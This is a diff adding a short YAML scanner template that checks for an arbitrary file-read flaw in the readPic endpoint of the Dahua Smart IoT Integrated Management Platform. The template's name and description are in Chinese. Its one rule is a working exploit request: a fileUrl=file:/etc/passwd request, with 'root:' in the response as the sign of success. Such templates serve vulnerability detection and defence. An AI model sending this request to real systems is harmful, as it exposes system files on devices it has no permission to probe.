@@ -1,0 +1,11 @@
+name: 大华智能物联综合管理平台-readPic-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
+    expression:
+      status: 200
+      body_all: ["root:"]
